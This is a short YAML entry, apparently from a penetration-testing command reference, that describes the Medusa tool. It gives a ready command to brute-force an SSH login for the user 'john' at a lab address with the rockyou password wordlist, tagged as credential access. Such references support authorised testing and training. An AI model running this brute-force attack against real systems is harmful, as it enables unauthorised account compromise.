---
description: |
  Medusa is a speedy, parallel, modular login brute-forcer that supports many network services. The following command brute-forces an SSH login for a known username against a password wordlist, trying each candidate password until a valid credential is found or the list is exhausted.

  Command Reference:

  	Target IP: 10.10.10.1

  	Username: john

  	Wordlist: /usr/share/wordlists/rockyou.txt

command: |
  medusa -h 10.10.10.1 -u john -P /usr/share/wordlists/rockyou.txt -M ssh
items:
  - Username
services:
  - SSH
OS:
  - Linux
phases:
  - CredentialAccess
references:
  - https://github.com/jmk-foofus/medusa
  - https://www.kali.org/tools/medusa/
---
